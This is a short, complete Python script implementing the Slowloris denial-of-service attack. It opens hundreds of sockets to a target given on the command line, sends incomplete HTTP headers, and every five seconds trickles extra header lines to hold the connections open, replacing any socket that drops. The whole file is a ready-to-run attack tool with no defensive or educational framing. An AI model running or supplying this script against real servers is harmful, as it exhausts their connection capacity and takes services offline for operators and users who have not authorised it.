#!/usr/bin/env python3
# slowloris.py <TARGET_IP> [PORT] [DURATIONSEC]
# Slow DoS: open many sockets, send partial HTTP headers slowly to keep connections open.
import socket
import sys
import time
import random

TARGET = sys.argv[1]
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
DURATION = int(sys.argv[3]) if len(sys.argv) > 3 else 20
SOCKET_COUNT = 900

def make_socket(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip, port))
    # send an incomplete HTTP request (no final blank line -> server keeps waiting)
    s.send(f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n".encode("utf-8"))
    s.send(f"Host: {ip}\r\n".encode("utf-8"))
    s.send("User-Agent: Mozilla/5.0\r\n".encode("utf-8"))
    s.send("Accept-language: en-US,en\r\n".encode("utf-8"))
    return s

def main():
    print(f"[Slowloris] target={TARGET}:{PORT} sockets={SOCKET_COUNT} duration={DURATION}s")
    sockets = []
    for _ in range(SOCKET_COUNT):
        try:
            sockets.append(make_socket(TARGET, PORT))
        except socket.error:
            break
    print(f"[Slowloris] opened {len(sockets)} sockets, holding...")

    start = time.time()
    while time.time() - start < DURATION:
        # keep each socket alive by dribbling one more header line
        for s in list(sockets):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except socket.error:
                sockets.remove(s)
                # replace the dead socket
                try:
                    sockets.append(make_socket(TARGET, PORT))
                except socket.error:
                    pass
        time.sleep(5)   # slow drip every 5s
    for s in sockets:
        s.close()
    print("[Slowloris] done")

if __name__ == "__main__":
    main()
